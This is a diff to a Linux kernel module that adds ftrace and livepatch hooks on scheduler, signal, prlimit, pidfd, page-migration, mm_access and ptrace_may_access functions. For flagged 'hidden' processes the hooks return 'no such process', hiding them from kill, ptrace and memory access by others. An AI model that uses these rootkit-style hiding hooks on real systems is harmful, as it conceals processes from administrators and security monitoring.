@@ -33,6 +33,7 @@
 #include <linux/fsnotify_backend.h>
 #include <linux/version.h>
 #include <linux/icmp.h>
+#include <linux/mempolicy.h>
 #include "ftrace_hook.h"
 
 
@@ -112,7 +113,7 @@ static void (*p__printk_safe_enter)(void) = NULL;
 static void (*p__printk_safe_exit)(void) = NULL;
 
 static struct tgid_iter (*p_next_tgid)(struct pid_namespace *ns, struct tgid_iter iter) = NULL;
-static bool (*p_ptrace_may_access)(struct task_struct *task, unsigned int mode) = NULL;
+//static bool (*p_ptrace_may_access)(struct task_struct *task, unsigned int mode) = NULL;
 static bool (*p_proc_fill_cache)(struct file *file, struct dir_context *ctx,
 		const char *name, unsigned int len,
 		instantiate_t instantiate, struct task_struct *task, const void *ptr) = NULL;
@@ -161,6 +162,8 @@ static rwlock_t *p_tasklist_lock = NULL;
 static struct ftrace_ops *p_kprobe_ftrace_ops = NULL;
 static struct ftrace_ops *p_kprobe_ipmodify_ops = NULL;
 
+
+static asmlinkage bool (*real_ptrace_may_access)(struct task_struct *task, unsigned int mode);
 static bool has_pid_permissions(struct pid_namespace *pid,
                                  struct task_struct *task,
                                  int hide_pid_min)
@@ -169,7 +172,8 @@ static bool has_pid_permissions(struct pid_namespace *pid,
                 return true;
         if (in_group_p(pid->pid_gid))
                 return true;
-        return p_ptrace_may_access(task, PTRACE_MODE_READ_FSCREDS);
+        //return p_ptrace_may_access(task, PTRACE_MODE_READ_FSCREDS);
+        return real_ptrace_may_access(task, PTRACE_MODE_READ_FSCREDS);
 }
 
 static int get_task_exe(char *buf, int buflen, struct task_struct *task)
@@ -914,10 +918,94 @@ static asmlinkage long ftrace_security_task_getscheduler(struct pt_regs *regs)
 	return real_security_task_getscheduler(regs);
 }
 
-static asmlinkage long (*real_security_task_getsid)(struct pt_regs *regs) = NULL;
-static asmlinkage long ftrace_security_task_getsid(struct pt_regs *regs)
+static asmlinkage long (*real_do_sched_setscheduler)(struct pt_regs *regs) = NULL;
+static asmlinkage long ftrace_do_sched_setscheduler(struct pt_regs *regs)
+{
+	return real_do_sched_setscheduler(regs);
+}
+
+static asmlinkage long (*real_sched_setaffinity)(struct pt_regs *regs) = NULL;
+static asmlinkage long ftrace_sched_setaffinity(struct pt_regs *regs)
+{
+	return real_sched_setaffinity(regs);
+}
+
+static asmlinkage int (*real_sched_setattr)(struct pt_regs *regs) = NULL;
+static asmlinkage int ftrace_sched_setattr(struct pt_regs *regs)
+{
+	return real_sched_setattr(regs);
+}
+
+static asmlinkage int (*real_do_tkill)(struct pt_regs *regs) = NULL;
+static asmlinkage int ftrace_do_tkill(struct pt_regs *regs)
+{
+	return real_do_tkill(regs);
+}
+
+static asmlinkage int (*real_do_rt_sigqueueinfo)(struct pt_regs *regs) = NULL;
+static asmlinkage int ftrace_do_rt_sigqueueinfo(struct pt_regs *regs)
+{
+	return real_do_rt_sigqueueinfo(regs);
+}
+
+static asmlinkage int (*real_do_rt_tgsigqueueinfo)(struct pt_regs *regs) = NULL;
+static asmlinkage int ftrace_do_rt_tgsigqueueinfo(struct pt_regs *regs)
+{
+	return real_do_rt_tgsigqueueinfo(regs);
+}
+
+static asmlinkage int (*real_set_one_prio)(struct pt_regs *regs) = NULL;
+static asmlinkage int ftrace_set_one_prio(struct pt_regs *regs)
+{
+	return real_set_one_prio(regs);
+}
+
+static asmlinkage int (*real_security_task_getsid)(struct pt_regs *regs) = NULL;
+static asmlinkage int ftrace_security_task_getsid(struct pt_regs *regs)
 {
 	return real_security_task_getsid(regs);
+}
+
+static asmlinkage int (*real_security_task_setpgid)(struct pt_regs *regs) = NULL;
+static asmlinkage int ftrace_security_task_setpgid(struct pt_regs *regs)
+{
+	return real_security_task_setpgid(regs);
+}
+
+static asmlinkage int (*real_kernel_migrate_pages)(struct pt_regs *regs) = NULL;
+static asmlinkage int ftrace_kernel_migrate_pages(struct pt_regs *regs)
+{
+	return real_kernel_migrate_pages(regs);
+}
+
+static asmlinkage int (*real_kernel_move_pages)(struct pt_regs *regs) = NULL;
+static asmlinkage int ftrace_kernel_move_pages(struct pt_regs *regs)
+{
+	return real_kernel_move_pages(regs);
+}
+
+static asmlinkage int (*real_do_prlimit)(struct pt_regs *regs) = NULL;
+static asmlinkage int ftrace_do_prlimit(struct pt_regs *regs)
+{
+	return real_do_prlimit(regs);
+}
+
+static asmlinkage int (*real_pidfd_create)(struct pt_regs *regs) = NULL;
+static asmlinkage int ftrace_pidfd_create(struct pt_regs *regs)
+{
+	return real_pidfd_create(regs);
+}
+
+static asmlinkage struct mm_struct * (*real_mm_access)(struct pt_regs *regs) = NULL;
+static asmlinkage struct mm_struct * ftrace_mm_access(struct pt_regs *regs)
+{
+	return real_mm_access(regs);
+}
+
+static asmlinkage bool (*real_ptrace_may_access)(struct pt_regs *regs) = NULL;
+static asmlinkage bool ftrace_ptrace_may_access(struct pt_regs *regs)
+{
+	return real_ptrace_may_access(regs);
 }
 
 static asmlinkage int (*real_reboot_pid_ns)(struct pid_namespace *pid_ns, int cmd) = NULL;
@@ -996,6 +1084,87 @@ static asmlinkage int ftrace_security_task_getscheduler(struct task_struct *p)
 	return real_security_task_getscheduler(p);
 }
 
+static asmlinkage long (*real_do_sched_setscheduler)(pid_t pid, int policy,
+					 struct sched_param __user *param) = NULL;
+static asmlinkage long ftrace_do_sched_setscheduler(pid_t pid, int policy,
+					 struct sched_param __user *param)
+{
+	if (!param || pid < 0)
+		return -EINVAL;
+	if (is_hidden_proc_pid(pid))
+		return -ESRCH;
+
+	return real_do_sched_setscheduler(pid, policy, param);
+}
+
+static asmlinkage long (*real_sched_setaffinity)(pid_t pid, const struct cpumask *in_mask) = NULL;
+static asmlinkage long ftrace_sched_setaffinity(pid_t pid, const struct cpumask *in_mask)
+{
+	if (is_hidden_proc_pid(pid))
+		return -ESRCH;
+
+	return real_sched_setaffinity(pid, in_mask);
+}
+
+static asmlinkage int (*real_sched_setattr)(struct task_struct *p, const struct sched_attr *attr) = NULL;
+static asmlinkage int ftrace_sched_setattr(struct task_struct *p, const struct sched_attr *attr)
+{
+	if (is_hidden_proc(p))
+		return -ESRCH;
+
+	return real_sched_setattr(p, attr);
+}
+
+static asmlinkage int (*real_do_tkill)(pid_t tgid, pid_t pid, int sig) = NULL;
+static asmlinkage int ftrace_do_tkill(pid_t tgid, pid_t pid, int sig)
+{
+	if (is_hidden_proc_pid(pid))
+		return -ESRCH;
+
+	return real_do_tkill(tgid, pid, sig);
+}
+
+static asmlinkage int (*real_do_rt_sigqueueinfo)(pid_t pid, int sig, kernel_siginfo_t *info) = NULL;
+static asmlinkage int ftrace_do_rt_sigqueueinfo(pid_t pid, int sig, kernel_siginfo_t *info)
+{
+	if ((info->si_code >= 0 || info->si_code == SI_TKILL) &&
+			(task_pid_vnr(current) != pid))
+		return -EPERM;
+
+	if (is_hidden_proc_pid(pid))
+		return -ESRCH;
+
+	return real_do_rt_sigqueueinfo(pid, sig, info);
+}
+
+static asmlinkage int (*real_do_rt_tgsigqueueinfo)(pid_t tgid, pid_t pid, int sig, kernel_siginfo_t *info) = NULL;
+static asmlinkage int ftrace_do_rt_tgsigqueueinfo(pid_t tgid, pid_t pid, int sig, kernel_siginfo_t *info)
+{
+	/* This is only valid for single tasks */
+	if (pid <= 0 || tgid <= 0)
+		return -EINVAL;
+
+	/* Not even root can pretend to send signals from the kernel.
+	 * Nor can they impersonate a kill()/tgkill(), which adds source info.
+	 */
+	if ((info->si_code >= 0 || info->si_code == SI_TKILL) &&
+			(task_pid_vnr(current) != pid))
+		return -EPERM;
+
+	if (is_hidden_proc_pid(pid))
+		return -ESRCH;
+
+	return real_do_rt_tgsigqueueinfo(tgid, pid, sig, info);
+}
+
+static asmlinkage int (*real_set_one_prio)(struct task_struct *p, int niceval, int error) = NULL;
+static asmlinkage int ftrace_set_one_prio(struct task_struct *p, int niceval, int error)
+{
+	if (is_hidden_proc(p))
+		return -ESRCH;
+
+	return real_set_one_prio(p, niceval, error);
+}
 
 static asmlinkage int (*real_security_task_getsid)(struct task_struct *p) = NULL;
 static asmlinkage int ftrace_security_task_getsid(struct task_struct *p)
@@ -1006,6 +1175,108 @@ static asmlinkage int ftrace_security_task_getsid(struct task_struct *p)
 	}
 
 	return real_security_task_getsid(p);
+}
+
+static asmlinkage int (*real_security_task_setpgid)(struct task_struct *p, pid_t pgid) = NULL;
+static asmlinkage int ftrace_security_task_setpgid(struct task_struct *p, pid_t pgid)
+{
+	if (p) {
+		if (is_hidden_proc(p))
+			return -ESRCH;
+	}
+
+	return real_security_task_setpgid(p, pgid);
+}
+
+static asmlinkage int (*real_kernel_migrate_pages)(pid_t pid, unsigned long maxnode,
+                                 const unsigned long __user *old_nodes,
+                                 const unsigned long __user *new_nodes) = NULL;
+static asmlinkage int ftrace_kernel_migrate_pages(pid_t pid, unsigned long maxnode,
+                                 const unsigned long __user *old_nodes,
+                                 const unsigned long __user *new_nodes)
+{
+	if (is_hidden_proc_pid(pid))
+		return -ESRCH;
+	
+	return real_kernel_migrate_pages(pid, maxnode, old_nodes, new_nodes);
+}
+
+static asmlinkage int (*real_kernel_move_pages)(pid_t pid, unsigned long nr_pages,
+                              const void __user * __user *pages,
+                              const int __user *nodes,
+                              int __user *status, int flags) = NULL;
+static asmlinkage int ftrace_kernel_move_pages(pid_t pid, unsigned long nr_pages,
+                              const void __user * __user *pages,
+                              const int __user *nodes,
+                              int __user *status, int flags)
+{
+	 /* Check flags */
+         if (flags & ~(MPOL_MF_MOVE|MPOL_MF_MOVE_ALL))
+                 return -EINVAL;
+ 
+         if ((flags & MPOL_MF_MOVE_ALL) && !capable(CAP_SYS_NICE))
+                 return -EPERM;
+
+	if (is_hidden_proc_pid(pid))
+		return -ESRCH;
+
+	return real_kernel_move_pages(pid, nr_pages, pages, nodes, status, flags);
+}
+
+static unsigned int *p_sysctl_nr_open = NULL;
+static asmlinkage int (*real_do_prlimit)(struct task_struct *tsk, unsigned int resource,
+                 			struct rlimit *new_rlim, struct rlimit *old_rlim) = NULL;
+static asmlinkage int ftrace_do_prlimit(struct task_struct *tsk, unsigned int resource,
+                 			struct rlimit *new_rlim, struct rlimit *old_rlim)
+{
+	if (resource >= RLIM_NLIMITS)
+		return -EINVAL;
+	if (new_rlim) {
+		if (new_rlim->rlim_cur > new_rlim->rlim_max)
+			return -EINVAL;
+		if (resource == RLIMIT_NOFILE &&
+				new_rlim->rlim_max > *p_sysctl_nr_open)
+			return -EPERM;
+	}
+
+	if (is_hidden_proc(tsk))
+		return -ESRCH;
+
+	return real_do_prlimit(tsk, resource, new_rlim, old_rlim);
+}
+
+static asmlinkage int (*real_pidfd_create)(struct pid *pid) = NULL;
+static asmlinkage int ftrace_pidfd_create(struct pid *pid)
+{
+	struct task_struct *tsk = NULL;
+
+	tsk = get_pid_task(pid, PIDTYPE_TGID);
+	if (tsk) {
+		if (is_hidden_proc(tsk)) {
+			put_task_struct(tsk);
+			return -ESRCH;
+		}
+		put_task_struct(tsk);
+	}
+	return real_pidfd_create(pid);
+}
+
+static asmlinkage struct mm_struct * (*real_mm_access)(struct task_struct *task, unsigned int mode) = NULL;
+static asmlinkage struct mm_struct * ftrace_mm_access(struct task_struct *task, unsigned int mode)
+{
+	if (is_hidden_proc(task)) 
+		return ERR_PTR(-ESRCH);
+	
+	return real_mm_access(task, mode);
+}
+
+static asmlinkage bool (*real_ptrace_may_access)(struct task_struct *task, unsigned int mode) = NULL;
+static asmlinkage bool ftrace_ptrace_may_access(struct task_struct *task, unsigned int mode)
+{
+	if (mode == PTRACE_MODE_READ_REALCREDS && is_hidden_proc(task))
+		return 0;
+
+	return real_ptrace_may_access(task, mode);
 }
 
 static asmlinkage int (*real_reboot_pid_ns)(struct pid_namespace *pid_ns, int cmd) = NULL;
@@ -1151,10 +1422,126 @@ static asmlinkage  int ftrace_ptrace_attach(struct task_struct *task, long reque
 }
 #endif
 
+/* Check syscalls for hidden proc
+
+asmlinkage long sys_sched_getscheduler(pid_t pid);
+asmlinkage long sys_sched_getparam(pid_t pid,
+                                        struct sched_param __user *param);
+asmlinkage long sys_sched_getaffinity(pid_t pid, unsigned int len,
+                                        unsigned long __user *user_mask_ptr);
+asmlinkage long sys_getpriority(int which, int who);
+asmlinkage long sys_getpgid(pid_t pid);
+asmlinkage long sys_setpgid(pid_t pid, pid_t pgid);
+asmlinkage long sys_getsid(pid_t pid);
+asmlinkage long sys_sched_rr_get_interval(pid_t pid,
+                                struct __kernel_timespec __user *interval);
+asmlinkage long sys_sched_rr_get_interval_time32(pid_t pid,
+                                                 struct old_timespec32 __user *interval);
+
+asmlinkage long sys_kill(pid_t pid, int sig);
+asmlinkage long sys_pidfd_send_signal(int pidfd, int sig,
+                                       siginfo_t __user *info,
+                                       unsigned int flags);
+
+asmlinkage long sys_tkill(pid_t pid, int sig);
+asmlinkage long sys_tgkill(pid_t tgid, pid_t pid, int sig);
+asmlinkage long sys_rt_sigqueueinfo(pid_t pid, int sig, siginfo_t __user *uinfo);
+asmlinkage long sys_rt_tgsigqueueinfo(pid_t tgid, pid_t  pid, int sig,
+                			siginfo_t __user *uinfo);
+
+asmlinkage long sys_sched_setparam(pid_t pid,
+                                        struct sched_param __user *param);
+asmlinkage long sys_sched_setscheduler(pid_t pid, int policy,
+                                        struct sched_param __user *param);
+asmlinkage long sys_sched_setaffinity(pid_t pid, unsigned int len,
+                                        unsigned long __user *user_mask_ptr);
+
+asmlinkage long sys_setpriority(int which, int who, int niceval);
+
+asmlinkage long sys_migrate_pages(pid_t pid, unsigned long maxnode,
+                                const unsigned long __user *from,
+                                const unsigned long __user *to);
+asmlinkage long sys_move_pages(pid_t pid, unsigned long nr_pages,
+                                const void __user * __user *pages,
+                                const int __user *nodes,
+                                int __user *status,
+                                int flags);
+
+asmlinkage long sys_prlimit64(pid_t pid, unsigned int resource,
+                                const struct rlimit64 __user *new_rlim,
+                                struct rlimit64 __user *old_rlim);
+
+asmlinkage long sys_pidfd_open(pid_t pid, unsigned int flags);
+
+asmlinkage long sys_process_vm_readv(pid_t pid,
+                                     const struct iovec __user *lvec,
+                                     unsigned long liovcnt,
+                                     const struct iovec __user *rvec,
+                                     unsigned long riovcnt,
+                                     unsigned long flags);
+asmlinkage long sys_process_vm_writev(pid_t pid,
+                                      const struct iovec __user *lvec,
+                                      unsigned long liovcnt,
+                                      const struct iovec __user *rvec,
+                                      unsigned long riovcnt,
+                                      unsigned long flags);
+
+asmlinkage long sys_sched_setattr(pid_t pid,
+                                        struct sched_attr __user *attr,
+                                        unsigned int flags);
+asmlinkage long sys_sched_getattr(pid_t pid,
+                                        struct sched_attr __user *attr,
+                                        unsigned int size,
+                                        unsigned int flags);
+
+asmlinkage long sys_perf_event_open(
+                struct perf_event_attr __user *attr_uptr,
+                pid_t pid, int cpu, int group_fd, unsigned long flags);
+asmlinkage long sys_kcmp(pid_t pid1, pid_t pid2, int type,
+                         unsigned long idx1, unsigned long idx2);
+
+============================================================================
+
+// prctl only set current task, so no hook
+asmlinkage long sys_prctl(int option, unsigned long arg2, unsigned long arg3,
+                         unsigned long arg4, unsigned long arg5);
+*/
+
 static struct ftrace_hook hooks[] = {
         HOOK("sched_getaffinity", ftrace_sched_getaffinity, &real_sched_getaffinity),
+	//  sys_sched_getparam,  sys_sched_getparam, sys_sched_rr_get_interval, sys_sched_rr_get_interval_time32 
+        //  sys_sched_getattr
         HOOK("security_task_getscheduler", ftrace_security_task_getscheduler, &real_security_task_getscheduler),
+        //  sys_sched_setparam, sys_sched_setscheduler
+        HOOK("do_sched_setscheduler", ftrace_do_sched_setscheduler, &real_do_sched_setscheduler),
+        //  sys_sched_setaffinity
+        HOOK("sched_setaffinity", ftrace_sched_setaffinity, &real_sched_setaffinity),
+        //  sys_sched_setattr
+        HOOK("sched_setattr", ftrace_sched_setattr, &real_sched_setattr),
+        //  sys_setpriority
+        HOOK("set_one_prio", ftrace_set_one_prio, &real_set_one_prio),
+        //  sys_tkill sys_tgkill
+        HOOK("do_tkill", ftrace_do_tkill, &real_do_tkill),
+	// sys_rt_sigqueueinfo
+        HOOK("do_rt_sigqueueinfo", ftrace_do_rt_sigqueueinfo, &real_do_rt_sigqueueinfo),
+	// sys_rt_tgsigqueueinfo
+        HOOK("do_rt_tgsigqueueinfo", ftrace_do_rt_tgsigqueueinfo, &real_do_rt_tgsigqueueinfo),
+	// sys_getpsid
         HOOK("security_task_getsid", ftrace_security_task_getsid, &real_security_task_getsid),
+	// sys_setpgid
+        HOOK("security_task_setpgid", ftrace_security_task_setpgid, &real_security_task_setpgid),
+	// sys_migrate_pages,
+        HOOK("kernel_migrate_pages", ftrace_kernel_migrate_pages, &real_kernel_migrate_pages),
+	// sys_migrate_pages,
+        HOOK("kernel_move_pages", ftrace_kernel_move_pages, &real_kernel_move_pages),
+	// sys_prlimit64,
+        HOOK("do_prlimit", ftrace_do_prlimit, &real_do_prlimit),
+	// sys_pidfd_open,
+        HOOK("pidfd_create", ftrace_pidfd_create, &real_pidfd_create),
+	// sys_process_vm_readv, sys_process_vm_writev
+        HOOK("mm_access", ftrace_mm_access, &real_mm_access),
+        // sys_perf_event_open, sys_get_robust_list, sys_kcmp 
+        HOOK("ptrace_may_access", ftrace_ptrace_may_access, &real_ptrace_may_access),
         HOOK("reboot_pid_ns", ftrace_reboot_pid_ns, &real_reboot_pid_ns),
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 1)
         HOOK("__fsnotify_parent", ftrace___fsnotify_parent, &real___fsnotify_parent),
@@ -1215,6 +1602,7 @@ static int ret_handler_do_sysinfo(struct kretprobe_instance *ri, struct pt_regs 
 
 static struct kretprobe krps[] = {
 	{
+		// sys_getpriority
 		.kp.symbol_name = "__x64_sys_getpriority",
 		.handler        = ret_handler_sys_getpriority,
 		.entry_handler  = entry_handler_sys_getpriority,
@@ -1259,10 +1647,12 @@ static struct klp_func funcs[] = {
 		.new_func = livepatch_module_get_kallsym,
 	},
 	{
+                // sys_kill
 		.old_name = "kill_pid_info",
 		.new_func = livepatch_kill_pid_info,
 	}, 
 	{
+		// sys_getpgid
 		.old_name = "do_getpgid",
 		.new_func = livepatch_do_getpgid,
 	}, 
@@ -1290,10 +1680,12 @@ static int livepatch_init(void)
 	if (!p_next_tgid)
 		return -1;
 
+	#if 0
 	p_ptrace_may_access = (bool (*)(struct task_struct *task, unsigned int mode)) 
 				kallsyms_lookup_name("ptrace_may_access");
 	if (!p_ptrace_may_access)
 		return -1;
+	#endif
 
 	p_proc_fill_cache = (bool (*)(struct file *file, struct dir_context *ctx,
 				const char *name, unsigned int len,
@@ -1456,6 +1848,11 @@ static int livepatch_init(void)
 	p_kprobe_ipmodify_ops = (struct ftrace_ops *)
 				 kallsyms_lookup_name("kprobe_ipmodify_ops");
 	if (!p_kprobe_ipmodify_ops)
+		return -1;
+
+	p_sysctl_nr_open = (unsigned int *)
+				 kallsyms_lookup_name("sysctl_nr_open");
+	if (!p_sysctl_nr_open)
 		return -1;
 
 	
